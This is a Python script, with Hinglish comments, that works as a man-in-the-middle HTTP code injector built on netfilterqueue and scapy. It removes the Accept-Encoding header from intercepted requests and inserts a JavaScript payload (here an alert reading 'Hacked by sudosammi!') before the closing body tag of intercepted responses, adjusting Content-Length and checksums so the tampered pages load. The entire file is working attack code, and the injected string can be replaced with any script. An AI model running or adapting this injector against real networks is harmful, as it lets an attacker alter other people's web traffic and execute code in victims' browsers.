import netfilterqueue
import scapy.all as scapy
import re

# ==========================================
# PACKET MODIFIER HELPER
# ==========================================
def set_load(packet, load):
    # Packet ki Raw layer (actual data) ko update karo
    packet[scapy.Raw].load = load
    # Purane security checks delete karo taaki Scapy naye calculate kare
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# ==========================================
# MAIN INTERCEPTION LOGIC
# ==========================================
def process_packet(packet):
    # NetfilterQueue packet ko Scapy format mein badlo
    scapy_packet = scapy.IP(packet.get_payload())
    
    # Check 1: Sirf un packets ko pakdo jinme 'Raw' data ho
    if scapy_packet.haslayer(scapy.Raw):
        # Check 2: (FIX) Sirf TCP packets handle karo taaki IndexError na aaye
        if scapy_packet.haslayer(scapy.TCP):
            load = scapy_packet[scapy.Raw].load.decode(errors="ignore")
            
            # Case A: HTTP Request (Computer se nikalne wala message)
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] HTTP Request Intercepted")
                # Server ko bolo ki data compress (gzip) karke na bheje
                load = re.sub(r"Accept-Encoding:.*?\\r\\n", "", load)
                
            # Case B: HTTP Response (Website se aane wala data)
            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] HTTP Response Intercepted")
                # Injection Code (Popup Alert)
                injection_code = "<script>alert('Hacked by sudosammi!');</script>"
                # HTML ke end tag se pehle apna code ghusao
                load = load.replace("</body>", injection_code + "</body>")
                
                # Content-Length update karo taaki browser page load kar sake
                content_length_search = re.search(r"(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))

            # Agar data mein koi badlav hua hai, toh use packet mein save karo
            if load != scapy_packet[scapy.Raw].load.decode(errors="ignore"):
                new_packet = set_load(scapy_packet, load.encode())
                packet.set_payload(bytes(new_packet))

    # Packet ko aage bhej do
    packet.accept()

# ==========================================
# EXECUTION
# ==========================================
print("[*] Code Injector Toll Plaza is Active (Queue 0)...")
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)

try:
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Shutting down and cleaning up...")
    queue.unbind()
